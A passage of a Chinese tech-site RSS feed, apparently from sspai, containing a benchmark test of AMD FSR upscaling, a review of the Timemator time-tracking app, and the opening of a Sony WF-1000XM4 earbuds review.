href=\"http://www.zhihu.com/question/285001010?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎样评价星游记下一部电影《星游记之冲出地球》？</a><br><a href=\"http://www.zhihu.com/question/51043844?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《吃货宇宙》？</a><br>\n","link":"http://www.zhihu.com/question/468570200/answer/1968823249?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"老显卡也能拥有的新体验：AMD FSR 实测","date":"2021-06-29 08:30:00","description":"\n<p>本周 PC 热门动态除了 Windows11 面世、显卡价格继续快速回落以外，还有就是 AMD 的超采样技术 FidelityFX Super Resolution（下文简称 FSR，超级分辨率锐画技术）的正式上线。</p>\n<p>作为伴随 RDNA2 显卡一同登场的 AMD 的光线追踪和 FSR 可以算是最让大家期待两个技术，光线追踪可以说目前和 RDNA2 显卡捆绑在一起；而普适性更强的FSR技术，也因为 AMD 的免费开放及开源支持旧卡甚至<strong>竞品</strong>，从而引发互联网的热议，那么这个技术到底会不会让 AMD 再次成为 yyds<sup class=\"ss-footnote\" href=\"\" title=\"永远的神\" footnote-id=\"1\">1</sup>，我也正好手握 Navi<sup class=\"ss-footnote\" href=\"\" title=\"Radeon RX 5000 系列\" footnote-id=\"2\">2</sup> 跟 Polaris<sup class=\"ss-footnote\" href=\"\" title=\"Radeon RX 500 系列\" footnote-id=\"3\">3</sup> 新旧两代卡，趁热实测下这款AMD的新品「防晒乳<sup class=\"ss-footnote\" href=\"\" title=\"FSR 是防晒乳的拼音首字母\" footnote-id=\"4\">4</sup>」。</p>\n<h2>FSR 的实现原理</h2>\n<p>FSR 和 DLSS 均采用了 <a href=\"https://www.zhihu.com/question/462609402/answer/1921160757\" target=\"_blank\">深度学习</a> 去计算画面，来实现从低分辨率渲染到高分辨率输出的「魔法」。而 FSR 和 DLSS 的不同之处在于，DLSS 会使用每一帧的前后帧去优化超采的结果， 而 FSR 只是单帧的图像超采算法，所以 FSR 可以不依赖特殊的处理单元（N 卡上的 Tensor Core）即可完成超分辨率的工作。</p>\n<p>FSR 主要由两个通道组成，一个是边缘自适应空间升频（EASU）的升频通道，它主要用于处理像素边缘的重建，这样才能在从低分辨率升频到高分辨率的同时保持边缘清晰。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/94801b177bc98b263e1ac6a19fb89f13\"><figcaption>不同的设置可以针对不同的边缘进行重建</figcaption></figure><p>另一个通道则是自适应强对比度锐化通道（RCAS），它会提取放大后图像中的细节进行智能锐化，从而获得更高像素、更清晰的的图像。</p>\n<p>而目前在这几个支持的游戏里面，画面设置菜单都有显著的 AMD FSR「FidelityFX Super Resolution」参数选项。开启后有 4 档设置可选，分别是超高质量「Ultra Quality」、质量「Quality」、均衡「Balance」以及性能「Performance」。这 4 个模式相对应的，就是 4 个不同的渲染倍数和扩展分辨率，从而对实际画面也产生速度及画质的影响。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/b31b47dec329d8a6127f7bbf7f6ce059\"><figcaption>FSR 不同的设置对应画面的关系</figcaption></figure><p>下面我们就一起看看 FSR 对游戏提升到底有多少。</p>\n<h2>测试环境与产品推荐</h2>\n<p>目前市面类似的技术还有大家已经挺熟悉的 DLSS，DLSS 从 1.0 到 2.0 的进化也是挺明显，当然目前最大的问题一个是普及率另外一个就是上手门槛了。除了这些超采样技术，游戏引擎自带的抗锯齿技术也一定程度可以实现类似的效果，所以很多时候还是要看实际表现。</p>\n<p>测试平台为了避免 CPU 瓶颈直接选了 618 期间大火的锐龙 9，其他配置包括：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/33f338dccb935499c1bd0cb49f7cc7fc\"><figcaption>本次测试的配置</figcaption></figure><p><strong>撼讯「红魔」Radeon RX 6800 XT</strong></p>\n<p>好不容易借到的高端卡，撼讯家的恶魔系列也算是非公A卡的代表了，<strong>「红魔」</strong>Radeon RX 6800 XT 采用了 16 相供电的非公版 PCB，以及三槽位 / 三风扇的外形设计（尾部穿透设计），视频口保留了一个 USB-C（很多非公都直接去掉），恶魔尾灯的设计也挺别。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/28e4413a42d82219a46070580075d7e1\"><figcaption>显卡</figcaption></figure><p><strong>微星 MAG X570 TOMAHAWK WIFI 战斧导弹</strong></p>\n<p>这款算是性价比的 X570，价格也跟类似规格的 B550 相当，属于良心性价比型号，供电规格强于不少同价位产品，所以我一直用它来搭配锐龙 9 超频使用，要不太浪费它的供电规格了。除了比较宽裕的功耗上限，微星目前比较稳定好用的 BIOS 以外，实际超频能力也不错，如果你不满足 B550 迫击炮，想添点预算强化下主板规格的话，确实可以考虑，任何规格的锐龙它都不怕。当然对比自家更高阶的型号，缺点大概就是 PCIe4.0 的 M.2 插槽只有一个。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/e7b3e5dadfcc288c072407a5330bf651\"><figcaption>主板</figcaption></figure><p><strong>分型工艺 Celsius+S36 Prisma 一体水冷散热器</strong></p>\n<p>毕竟处理器是锐龙 9，所以散热器的肯定越强越好，散热器是来自分型工艺的 Celsius+S36 Prisma ，虽然是小众型号但实际也是目前 360 一体水冷里面第一梯队性能表现，此外还有独特的设计，比如旋转冷头盖就可以直接切换水冷系统的转速模式（轻松切换静音），另外就是它独特的理线设计，也是目前我感觉设计最合理的方案之一，冷头部分可以告别了乱糟糟的线材。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/fc827dbb5d8a3f92962bd6f4dc882dc3\"><figcaption>散热器</figcaption></figure><p><strong>振华 LEADEX G 1000 电源</strong></p>\n<p>从去年底开始电源市场就有一个趋势，就是额定大功率电源的销量的提升，毕竟现在硬件平台 CPU 还有显卡对功耗要求越多，甚至连xhs上的用户都会要求建议配置千瓦级的电源。振华的 LG1000 就可以算是千瓦级的性价比型号，常年价格 1K 出头，相比白金认证版便宜了不少。</p>\n<p>支持 80PLUS 金牌/智能拔插全模组/智能温控/十年质保，而且白色/黑色同价，方便一些白色主机用户选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/8553a2043712e64eaeba424f5bd2ac37\"><figcaption>电源</figcaption></figure><p><strong>内存金士顿骇客神条Predator掠食者 DDR4 3600 8G*2</strong></p>\n<p>测试的内存来自金士顿的骇客神条 Predator 掠食者，这个系列也算经典了，不过后续因为品牌变动估计会有新品来替代。</p>\n<p><strong>SSD金士顿 NV1 2T</strong></p>\n<p>固态硬盘算是 NV1，当时主要看中 2T 的价格足够便宜，用来当游戏的仓库最合适不过的，毕竟 Epic的周周免费游戏，之前的硬盘完全不够用了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/ba5195ea07a1deb2df08c42ed48c8420\"><figcaption>硬盘和内存</figcaption></figure><p>测试游戏如下，目前支持 FSR 的游戏可以在这里 <a href=\"https://www.amd.com/zh-hans/technologies/radeon-software-fidelityfx-super-resolution#%E6%B8%B8%E6%88%8F\" target=\"_blank\">找到</a>：</p>\n<ul>\n<li>纪元1800</li>\n<li>银河破裂者</li>\n<li>众神陨落</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/50b2b94e877504d4f4bc2efa1150610a\"><figcaption>目前所支持的游戏</figcaption></figure><p>而目前暂时没有游戏同时支持 FSR 和 DLSS，故在下文中只有 FSR 的性能开启关闭的对比测试以及不同挡位的画面影响。</p>\n<h2>FSR 实测与结果对比</h2>\n<p>结果看图片，提升幅度够粗暴了吧，没有那种百分之几的提升，全部都是大幅度的速度提升。性能模式提升幅度基本都有翻倍。</p>\n<p>当然这边速度的提升，主要依靠降低实际渲染倍数然后通过算法尽量补充画面细节模拟原分辨率从而带来的提升，所以对实际游戏画面势必也会产生影响，而这个影响就跟游戏画面及算法都有关系。</p>\n<p>另外还有一个要注意的地方，就是随着FSR功能的开启，显存使用率也会降低，这对于老卡、核显也是特别有利的地方。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/ad023bbb2412e1bac5c2e97c62e7d165\"><figcaption>纪元 1800</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/7e485d9a2c12c2a60b19deca3a38f562\"><figcaption>银河破裂者</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/f402b7b2e6e51977963e92641ee55b3a\"><figcaption>众神陨落</figcaption></figure><h2>不同档位对画面的影响</h2>\n<p>前面说了这种加速方式对画面肯定会有影响，目前我们主要看的就是影响幅度多大，是否可以接受。</p>\n<p>我测试的时候特意外接 4K 大屏电视测试，分辨率跟实际可视画面大小都比较适合观察。其实主观看的话，对画面的影响还是可以感觉到，不过不同游戏甚至不同类型画面影响幅度不同，特别是默认画面跟超级质量之间的画面差异还特别小，所以最好自己实际测试来感知下大概哪个档位比较适合你。不过说真的，AMD 给预设的档位真的太多了，我测试都要累死了。</p>\n<p>画面只看缩略图其实感觉不大明显，因为网络本身也会压缩，所以只能局部 100% 放大对比。</p>\n<p>局部放大对比，比如众神陨落这个起始画面来看，影响比较明显是其实反倒是背景画面，默认画面哪怕是背景细节都是完整的，可以看到细节边缘，随着FSR档位的调整，越靠近速度档位画面的涂抹感就越强，不过哪怕到最强调速度的性能档位，大致轮廓还是比较清晰的，而且这还是局部细节，控制到这个结果还 OK。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/16e657953ce80ec72279145fdd623900\"><figcaption>远景细节对比</figcaption></figure><p>这个位置主要就是看头发跟地面的纹路细节。其实超级质量保留的图像信息挺不错，跟全默认感觉差异确实很小，就是太过锐化细节边缘。而越往后，可以感觉头发越粘成在一起了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/2932bd58d52a2d8c54693dd545f4da50\"><figcaption>发丝和地面的细节变化对比</figcaption></figure><p>另外不同类型甚至不同场景画面，FSR 影响程度的主观感觉也不同，所以尽量要自己体验感受下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/af5850b0d0ed937eec1b22d19e570630\"><figcaption>金属纹路的细节变化对比</figcaption></figure><h2>如何体验 FSR</h2>\n<p>想要体验 AMD FSR 技术的方法很简单：</p>\n<ol>\n<li>确认自己的 GPU（显卡）在下面 <a href=\"https://www.amd.com/zh-hans/technologies/radeon-software-fidelityfx-super-resolution\" target=\"_blank\">支持表</a>；</li>\n<li>AMD 用户下载最新的 21.6.1 版驱动；</li>\n<li>Steam 下载 <a href=\"https://store.steampowered.com/app/780310/The_Riftbreaker/?l=schinese\" target=\"_blank\">银河破裂者</a> 这款免费体验的游戏。</li>\n</ol>\n<p>三个步骤都搞定后，你就可以开始体验 AMD FSR 技术带来的了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/6468c77187f20f92b649adba60ef8713\"><figcaption>目前支持的显卡</figcaption></figure><h2>总结</h2>\n<p>毕竟 FSR 目前还是 1.0 版本，所以测试之前个人就有大概的预期，测试结果也基本符合：速度表现很直接很暴力，实际画面算法表现还有进步空间，但是关键在「免费」。</p>\n<p>AMD 目前对于技术的市场推广真的挺聪明，大家还可以回想起之前另外两个技术，一个是「FreeSync」，一个是「SAM<sup class=\"ss-footnote\" href=\"\" title=\"AMD 显存智取技术\" footnote-id=\"5\">5</sup>」。技术先进程度是一回事，技术运用本身 AMD 都没有故意拉高门槛特别是拒绝老用户，后续就是这两个技术都变为市场「标配」了，这就是格局。最后还是综合说下目前对 AMD FSR 的使用总结：</p>\n<p>首先，先不讨论效果的进一步优化空间，「FSR」实际目前最大的问题在于支持的游戏的数量，支持的游戏多了，就说明市场的认可程度。目前首发的几款游戏说真的都稍微小众了点，还是期待后续其它游戏，特别是用户群体比较大的网游类型游戏。</p>\n<p>想要让自己喜欢的游戏支持的话，赶紧去 AMD 官网留言哈！！！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/6849131997a18706a4ac3c3621bcbb52\"><figcaption>即将支持的游戏</figcaption></figure><p>其次就是免费及开源。任何技术要推广降低用户上手门槛都可以说是王道，所以 AMD 也很直接的免费及开源技术方案，方便开发者运用，而且目前包含微软、索尼也都对该技术感兴趣，未来说不定也会跟 FreeSync 一样成为各类游戏项目的标配。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/a0aaed6a27fd480ab905288384ee476a\"><figcaption>同样即将开源</figcaption></figure><p>再者支持旧卡甚至竞品。早期还在传闻 AMD 的 FSR 可能仅限支持 RX5X0 及以上的卡，现在实际的支持情况简直太有爱了吧，甚至包含 APU 还有竞品。这对老卡还有众多的 APU 用户（比如锐龙本）简直太友好了，毕竟是直接提升速度的技术，这就是格局。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/814a9f9c83b055fb7059fc74367ead7d\"><figcaption>支持旧显卡和竞品显卡</figcaption></figure><p>那么旧卡速度提升如何？我这边也实际用了一张 RX590GME 在 4K（1440P) 分辨率下测试，测试结果如下，速度提升幅度跟新卡无异，也让这张稍微入门的卡实现了 4K 60 FPS 的帧数，让我们一起喊出那六个字母！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/c11f8d80964c43566d26ee3636c330b3\"><figcaption>RX 590 在 4K 画面下的表现</figcaption></figure><p>最后速度 OK，虽然画面算法还有进一步提升空间，这个不单要直接跟竞品「大力水手 2.0」做对比，还要跟 TAA 之类游戏引擎自带方案对比，所以也期待加快技术的进化。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67469"},{"title":"强大和易用并存的时间记录应用：Timemator","date":"2021-06-29 07:24:25","description":"\n<p>一件事情不压到最后一刻就是不做；无法在约定的时间内完成任务，总是寻找到借口推脱；忙忙碌碌一整天，却感觉没做什么有价值的事情。我们时常感觉时间不够用，却不知一天中有大量时间被我们白白浪费。</p>\n<p>造成这种结果最主要的原因就是<strong>没有做好时间规划</strong>。</p>\n<p>怎么才能做好时间规划呢？除了践行各种任务管理、日程管理方法之外，还有另一个选择：践行时间记录。</p>\n<h2>时间记录的意义是合理规划时间</h2>\n<p>时间记录是一种时间管理的「笨办法」，它用一种近乎不用思考的方式，潜移默化培养着我们的时间意识，引导着我们一步一步规划自己的时间。</p>\n<p>有别于任务管理、日程管理这种自上而下的时间管理方法，时间记录是自下而上一步一步优化时间分配。通过统计我们的任务执行情况，客观地跟自己任务优先级进行对比。</p>\n<p>但同时，我们还是需要一些自上而下的思考。需要知道事情的优先次序，知道自己手头事项的紧急与否。正如柳比歇夫在《奇特的一生》书中所说：</p>\n<blockquote><p>如果每个人都能知道自己能干些什么，那生活会变得多么美好！因为每个人的能力都比他自己感觉到的大得多，也就不会有那么多的人感叹自己因能力有限而导致一事无成。</p></blockquote>\n<p>时间记录的美妙就在于此。<strong>通过一点一滴的记录强化时间管理，不追求能多完成几个任务，而在意时间规划的合理性，让一切都能按预期的方式进行</strong>。久而久之，势必带来巨大的改变，而这一切也要归功于合理规划时间。</p>\n<p>柳比歇夫的时代主要依靠纸笔记录时间，而现在的我们完全可以将这个繁琐的事情简单化，让践行时间记录更轻松惬意。在尝试了诸如 Timetrack.io、Toggl track 这些时间记录工具后，我最终选择了 Timemator。</p>\n<h2>使用 Timemator 记录时间</h2>\n<p>Timemator 是一款 Mac、iOS 双平台的时间自动记录应用，它会自动捕获你在 Mac 上所做的一切，只需点击几下即可将这些活动分配到对应的任务上，极大提高时间记录的效率。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/3f9cc3e34d7a1e866f45eae44ed04c92\"></figure><p>不同于其他时间记录工具，Timemator 是一个状态栏程序，它没有独立的主窗口界面，所有操作都通过点击状态栏图标弹出的小窗口实现。因此你可以在任何时候从状态栏快速操作它。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/04/29/article/dec41936ee0fd7da017b492a3cccd3cc\"></figure><p>Timemator 的使用流程非常简单：你只需要点击左下角的「+」添加时间事项或文件夹，再点击事项左侧的开始按钮就可以启动计时。在积累了一些记录之后，点击界面底部的「Reports」按钮打开统计功能，即可查看自己的时间统计报告。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/27a7877ff2041227ccd71249feed3d1f\"></figure><h2>划定使用场景，设置时间事项</h2>\n<p>在开始记录之前，最重要的工作是设置自己的时间事项。</p>\n<p>居家、工作、休闲娱乐、交通、吃饭、睡觉，这几类基本能涵盖大多数人一天所做了。而具体的设置，可以围绕这几类事项进行扩展，根据自己重点关注的事项进一步细化。</p>\n<p>例如你比较关注吃饭的时间，可以在居家这个场景下，明确增加吃饭这个任务，其他不太关注的比如做家务、做饭，就可以直接用居家这个大类概括。这样做的好处是降低记录的频率，聚焦重点事项。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/04/29/article/c2fcc7d156eeaf514456068b0163cb85\"></figure><p>在 Timemator 中，提供了文件夹和任务的概念用于创建记录事项。这里分享我的事项设置作为参考：</p>\n<ul>\n<li>日常居家： 居家、吃饭、个人护理、家务、做饭洗碗、睡觉</li>\n<li>外出活动： 逛街购物、聚会、交通、医院就医</li>\n<li>工作：主工作、斜杠工作</li>\n<li>运动： 散步、跑步、其他运动</li>\n<li>Better me：阅读、 学习探索、读书、学习、写作、复盘</li>\n<li>娱乐休闲：旅游游玩、电影电视、游戏、上网闲看、视频</li>\n</ul>\n<p>需要说明的是，并非一开始就必须设置这么多事项，其中大部分是在记录过程中新添加的。比如医院就医，是因为去医院看病，没有合适的事项才增加医院就医这一项，平时也是使用频率非常低的一类。</p>\n<p>所以只要几个能概括的大类和重点关注的方向就可以开始时间记录，之后过程中再根据实际需要逐渐细化，这会让开始的门槛变得更低。</p>\n<p>当事项逐渐变多时，就可以用文件夹来整理。在 Timemator 中，每个文件夹都可以自定义颜色。设置颜色后这个文件夹下的所有的任务都会使用这个主题色，在时间轴中能直观看到时间消耗。利用这个特性，我们可以根据事项的不同特点为其设置不同的主题色：</p>\n<ul>\n<li>红色和橙色：想要避免的事项，例如娱乐休闲，打游戏</li>\n<li>紫色：不太关注的事项，例如睡觉（其实有灰色更好，但没有这个选项就有点遗憾）</li>\n<li>蓝色：日常需要关注的事项，例如工作、交通</li>\n<li>绿色：鼓励和提倡的事项，例如读书、家务、复盘</li>\n</ul>\n<p>这是我一周的记录，可以一眼看到各类事项时间的分配。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/e467292f5f80a7b00b3f6a24b04c084e\"></figure><h2>最重要的核心功能——自动记录时间</h2>\n<p>在 Timemator for mac 中，最核心的一项功能是自动记录。它能自动记录我们在电脑上的所有操作，根据设定的规则自动匹配事项的时间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/d53709205b2d98a10e9e99668ce3e8df\"></figure><p>Timemator 允许我们通过逻辑关系建立多个条件来匹配事项，设置也非常简单：只需要在主页事项右边的「闪电」按钮就可以进入，也可以在任务上右键选择「Edit Rules」。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/04/29/article/fd76f83f9978dde8ae73431c1e1727e5\"></figure><p>它提供的选项几乎能涵盖任何电脑上的操作，甚至连浏览不同网页和不同文件也可以轻易区分。</p>\n<p>它支持多种事件，包括：</p>\n<ul>\n<li>启动某个程序：当打开一个程序之后启动计时，如果之后没有触发其他规则将一直保持计时状态；</li>\n<li>激活某个程序的窗口：当前停留在某个程序界面时候启动计时，如果切换到其他程序则停止；</li>\n<li>打开某个文件：打开一个文件之后启动计时，如果切换到其他窗口则停止；</li>\n<li>打开某个文件夹下的文件：打开的文件属于指定的文件夹时启动计时，切换到其他窗口时停止；</li>\n<li>当前窗口的标题：当前程序窗口的标题符合规则时启动计时，如果切换到其他窗口则停止（但由于很多 app 并不能直接知道窗口的标题，所以可以在系统工具「活动监视器」中查找当前窗口的标题）；</li>\n<li>打开指定网站 URL：在浏览器中浏览指定的网页地址时启动计时，切换到其他窗口时停止。</li>\n</ul>\n<p>而这些事件还可以设置更精细的匹配规则，使规则设置更灵活，满足更多场景。例如打开指定网站 URL 的规则，可以设置包含关键词或者以某个关键词开头或结尾。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/5939af0c56124b2c4e0a86cdaf77e0d3\"></figure><p>下图是创建一个浏览少数派网站的规则，为了能记录下所有少数派的页面，可以指定访问的 URL 包含「sspai」关键词，这样基本所有少数派相关的页面都能记录到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/aa631024fa1fa30bfdcaf6f93c89c911.gif\"></figure><p>如果某个事项可以被多个操作触发，则可以创建多条规则，只要满足其中一条，即可触发自动记录。这是我为主工作设置的匹配事项，当打开工作相关的程序、文件和网页时，都会启动计时。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/9afe7141a656b5bab1109da110a7fb6c\"></figure><p>网页和文件名都可以用「contains」 来表示包含某些关键词，还可以使用正则表达式来匹配文件名。很多时候工作文件都有相同的命名规则，Timemator 就能根据文件名判断现在是不是在工作。</p>\n<p>是想要自动记录正常工作，需要给 Timemator 开启系统辅助功能的权限，在「系统偏好设置-安全性与隐私」中，找到辅助功能，勾选 Timemator 即可。首次开启自动记录，timemator 也会很人性化地引导我们开启这个权限。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/535282b8f201c7f3899a09b5c479c338\"></figure><p>一切设置好后，自动记录就会开始工作，不需要额外的点击或其他操作。</p>\n<p>值得注意的是，如果当前手动开启了一个计时任务时，自动记录不会立刻开始。直到手动关闭当前的计时任务之后，Timemator 才会启动自动记录。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/92a8b7361e7fc0a9452e08b4c7f4ad3b.gif\"></figure><p>如果你想临时停止某个规则，则可以在其激活的时候手动暂停关闭它。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/04/29/article/8b496dd4936433aa3f04e2ba51a8599b\"></figure><p>除了强大的匹配规则，自动记录的体验也设计的恰到好处。你会发现在规则触发并不是实时的，而是会等待几秒钟才触发，这个设计非常巧妙。</p>\n<p>在触发和停止规则的前后都可以指定一个「安全时间」。在这个时间范围内依然会保持当前记录的事项。如果你正在编辑文档的时候收到了微信消息，那么短暂回复消息的几秒钟其实并没有必要记录，更不想因此打断当前的连续工作时间。所以 Timemator 会默认设置一个 10 秒的安全时间，这确实会让最终呈现出来的报告可读性更好。</p>\n<p>在安全时间的范围内，状态栏会展示一个倒计时进度条，可以很直观了解当前的状态，同时也给我们一个提醒：不要轻易打断当前的工作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/52de4ab6e706b8c8dd6d550bad410f2e\"></figure><p>开启自动记录后，Timemator 会默认将所有操作记录都保存下来，那些没有匹配到规则的操作也会被存储起来，这样如果我们增加了新的匹配规则，就可以很轻松地恢复当天的记录。</p>\n<p>另外在单日报告中，对于占用时间较多的没有匹配的事项，鼠标悬停还会弹出分配到记录事项的提示，可以一键将时间分配到自己的记录事项中去，确实省心了不少。有了这个功能，更不用担心自己规则设置不完善了，完全可以放心记录，之后再补充匹配规则。</p>\n<h2>基础功能之上的撒手锏——自动计算工作薪酬</h2>\n<p>Timemator 支持自动计算按时间付费的工作报酬，可以对任务设定一个时薪，在报表中就会自动统计出报酬总额。除此之外还可以在统计报表中标记是否已支付，考虑得很周到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/81334aee94fdab50e43b6b63f9e2c078.png\"></figure><p>例如我的业余工作是按小时计费的，那么我可以为它设置一个每小时30元的时薪，在任务上右键选择编辑即可打开设置。Timemator 的默认货币是美元，在设置中可以任意切换成其他货币，我已经提前设置为人民币了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/2164091893e66db872ef6a6b1d55768b.png\"></figure><p>设置好时薪后，在统计报告中就能自动计算一段时间的总计收入。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/b8b315dda7f2967e70232f477fbb1e37.png\"></figure><p>如果想要计算哪些是已经支付过的话，切换到列表视图就可以对已经完成的工作进行标记，可以设置为已经出账或者已经支付，便于自己核对收入。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/e79de51f836b45980ec4c394e5c66bc0.png\"></figure><p>不过这种计算时薪的工作多在远程办公和兼职的场景出现，在国内会显得更小众一些。即便没有记时付费的工作，其实还可以利用这个功能算算自己浪费的时间价值。给那些被浪费的时间定个价，比如一小时 20 元，一个月之后看看自己白白浪费了多少价值，也算是对自己的一个反向激励。</p>\n<h2>移动端同步——和 iOS 端配合记录</h2>\n<p>除了 Mac 端之外，Timemator 同时支持 iOS 端，iOS 端的功能非常齐全，和 Mac 端几乎一致。它们的数据通过 iCloud 同步，在一端开启的计时也会及时同步到另一端。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/9bbebfdb7210ee8ded6cba5895947646.png\"></figure><p>不像 Mac 端可以对电脑操作进行自动记录，iOS 端就没有这个功能了，所有的计时操作都需要手动启动和停止。但使用移动端最大的好处，是不受地域限制随时记录。Mac 端更适合记录电脑上的工作，和 iOS 端结合就可以把一天24小时所有事情都记录下来，这对于养成时间记录的习惯来说至关重要。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/04/29/58f98260ceaa6e721b365b8008f55f9c.png\"></figure><p>并且移动端有一个美观的桌面小组件，放在主屏上的小组件不仅能显示当前记录的时间，也能避免我们忘记切换当前事项。</p>\n<h2>不只是记录——使用 Report 定期回顾</h2>\n<p>在记录一段时间之后，就可以查看我们记录的成果了。 Timemator 提供了完善的统计功能，支持导出 CSV 和 PDF 文件，便于分享和二次分析。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/b9c02a40aeafda99480c6ceaf792867b.png\"></figure><p>统计功能主要是围绕两个维度进行数据呈现，一个是时间，另一个则是事项。我们可以按天、周、月、年，甚至是自定义任意时间范围查看统计数据，也可以指定只查看某些事项的统计数据。围绕这两个维度，大部分的统计和分析需求都能满足。</p>\n<p>通常我习惯按周回顾数据，每周一的早上都会抽时间查看上周的时间记录，Timemator 默认的周视图可以以一种非常直观的方式看到时间分配情况，由于前期对不同事项分配了颜色，几乎可以毫不费力的了解一整周的时间分配。</p>\n<p>在右侧的事项列表可以查看每个事项的小时数，大部分情况下这些数据就足够了。在每天的柱图顶部还有比较小的文字显示当天累计记录的时间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/6f583d384e144e21384524066685af7b.png\"></figure><p>除了柱状图模式，还可以切换到列表模式查看具体事项的记录，不过这个功能我用的并不多，更多是在查看具体某一天的时间安排时会用到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/2c393fe895d736cc949255f1d8051517.png\"></figure><p>美中不足的就是 Timemator 没有提供饼图，不能很方便查看各事项的时间分配占比，但可以通过导出的 csv 自己在 Excel 中分析。</p>\n<h2>写在最后</h2>\n<p>Timemator 功能固然强大，但重要的是时间记录本身，我们更需要理解时间记录的意义和价值。</p>\n<p>时间记录并不是时间管理中必不可少的一环，但它却能用最简单的方式，帮我们合理规划时间。一个好工具能让自己更享受记录的过程，时间记录的终极目标仍然是为了让自己变得更好，了解自己，成就更好的自己。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/66354"},{"title":"手中的 Bose 还想留着，但它已经没那么香了：WF-1000XM4 上手体验","date":"2021-06-29 06:30:25","description":"\n<p>WF-1000XM4 到手之前，我在平时二手电子设备流动性最大的那个好友群里说了很多「怪话」，比如「不出意外我可能会出掉 Bose QuietComfort Earbuds」「NFC 一靠就连、LDAC 高码率传输简直不要太爽」「佩戴体验能做到 Bose 的 80% 我就心满意足」……</p>\n<p>WF-1000XM4 和 Bose QuietComfort Earbuds，不出意外应该都是当下 2000 元价位真无线降噪耳机中「天花板」一样的存在了，我则是一个最近从后者跳到前者的用户。</p>\n<p>长话短说——本以为 WF-1000XM4 能让我干脆利落地换掉 Bose QuietComfort Earbuds，现实却并不是这样。</p>\n<hr>\n<p><strong>🧐 继续阅读意味着你同意以下内容：</strong></p>\n<ul>\n<li>本文出现的产品均为少数派自购，不存在任何商业推广，也不会在题图上标注「广告」标识。</li>\n<li>本文内容以编辑实际体验为准，可能无法代表最广泛的实际用例。</li>\n<li>在文章评论区留下评论，意味着你同意 <a href=\"https://sspai.com/post/37739\">少数派用户协议</a> 和 